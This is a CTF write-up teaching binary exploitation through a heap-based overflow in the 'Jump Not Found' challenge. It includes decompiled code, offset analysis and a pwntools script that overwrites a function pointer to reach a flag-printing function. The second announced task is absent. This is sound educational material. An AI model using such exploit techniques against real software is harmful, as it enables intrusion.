# Detailed Writeups: Binary Exploitation #

To make sure that i learned something well , i always want to write an article about that topic and it'll be an opportunity to do more researchs about it.
The last two days our team Fword participated in two CTFs (UMD CTF and WPICTF) and we were among the top 20 teams in both CTFs so GJ guys <3 anyway that's why i decided to choose the best pwn tasks and write these detailed writeups about them to be a great practical introduction for people who want to dive into binary exploitation .

**Note:** This article assumes that you have basic knowledge of assembly and C language

## Summary ##

1- **Jump Not Found** From UMD CTF : heap based overflow

2- **Dorsia3** From WPI CTF: Format string Vulnerability

## Jump Not Found 400pts (25 solves) ##

![TASK](https://imgur.com/nerLXcA.png)

**Note:** You can Download the binary [HERE](https://github.com/kahla-sec/CTF-Writeups/blob/master/UMDCTF%202020/Jump%20Not%20Found/JNF), give it a try alone before reading the writeup that's the best way to LEARN .

### TL;DR ###

- Exploit a Heap based overflow to overwrite a function address with the Win function address

- Bypass a little problem of the presence of "0x0a"("\n") in the Win function address

### Introduction ###

Before diving into the exploitation part , let's talk about the heap section ,you have probably heard or used **malloc** or **calloc** functions in C ,
these functions are used to allocate memory on the heap,it is a region of your computer's memory that is not managed automatically for you and used for dynamic memory allocation, unlike the stack which we dont have full control over it.

![SECTIONS](https://imgur.com/aVPbDZM.png)

The allocation algorithm in an abstract way is quite simple , we won't dive into too much details , when for example we want to allocate a chunk of 16 bytes using malloc, it's reserved in the heap and malloc returns the address of the beginning of the chung where we can store data.

To know where the next free chunk starts before each allocated chunk its size is allocated so the address of the next free chunk will be :

> Address of the beginning of chunk1 + Its size 

This was in a really abstract way , you can do more research alone if you are interested , there is a lot of ressources in the internet :D

![Allocation](https://imgur.com/7ewvjK7.png)

### Exploitation ###

Let the fun begin now :D after downloading the binary let's do some basic reverse engineering and read carefully its code , i used ghidra for that purpose , you can download it from its official website.

![CODE](https://imgur.com/Ra3YFyG.png)

Observing the main function , we can notice that it's allocation two chunks , the first one its size is 0x42 (66 bytes) where our input will be stored and a second chunk which holds an array of function pointers , and based on our input (1 or 2 or 3) the program will call the appropriate function from the heap .

```C
  local_20 = (char *)malloc(0x42);
  local_18 = (code **)malloc(0x18);
  *local_18 = jumpToHoth;
  local_18[1] = jumpToCoruscant;
  local_18[2] = jumpToEndor;
```
Of course as the most vigilant readers noticed , it's using the dangerous function **gets** so we have the possibility to overflow stuffs :D Now here is our plan:

We will abuse the gets function and overwrite the jumpToHoth address with **jumpToNaboo** function which will prints the flag for us
Before that we need to figure out the offset so let's open the binary in gdb, set a breakpoint after gets and enter a simple pattern

![GDB](https://imgur.com/Xpc9YFp.png)

After that let's visualize the interesting part of the heap 

![HEAP](https://imgur.com/qb2XMHG.png)

As you can see the "AAAAAAAABBBBBBBB" that we have entered followed by the array of function pointers , so the offset is obvious now which is 80, let's begin writing our exploit :

```python

from pwn import *
p=process("./JNF")
#p=remote("192.241.138.174",9996)
p.recvuntil("CONSOLE>")
WIN=p64(0x000000000040070e)
OFFSET="1"+"A"*79
payload=OFFSET
payload+=WIN
p.sendline(payload)
log.info("Found Flag ! ")
p.interactive()

```

The reason why i wrote **OFFSET="1"+"A"*79** is that if you have read the code carefully we will notice that the choice of the function that will be executed is loaded from the beginning of the chunk (which is logic) so i wanted to do it in one shot.

```C
        gets(local_20);
        lVar2 = strtol(local_20,&local_28,10);
        *(short *)(local_20 + 0x40) = (short)lVar2;
        sVar1 = *(short *)(local_20 + 0x40);
        if (sVar1 != 2) break;
        puts("Checking navigation...");
        (*local_18[1])();
      }
      if (2 < sVar1) break;
      if (sVar1 == 1) { .....
```
**Why 0x000000000040070e not the real address 0x000000000040070a**

![FUNC](https://imgur.com/LcvZ0yt.png)

As we know gets function stops when it encounters "\n" (0x0a) so entering the real address of the win function will terminate our input and thus we will never be able to write the address where we want :(
Fortunately observing the assembly code of **jumpToNaboo** function we will see that we can start from the address that holds the part we want , which is printing the flag :

![ASSEMBLY](https://imgur.com/YEv55cw.png)

And Finally running the exploit will bring the flag for us :D

![FLAG](https://imgur.com/Hzqpy0X.png)
